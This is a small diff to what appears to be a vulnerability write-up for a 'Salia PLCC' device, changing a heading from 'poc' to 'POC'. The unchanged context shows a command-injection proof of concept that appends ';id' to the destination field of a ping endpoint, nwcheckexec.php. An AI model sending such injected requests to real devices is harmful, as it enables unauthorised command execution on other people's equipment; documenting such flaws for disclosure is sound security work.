@@ -5,7 +5,7 @@
 "Salia PLCC"
 ```
 
-## poc
+## POC
 ```
 /nwcheckexec.php?type=ping&dest=8.8.8.8;id
 ```
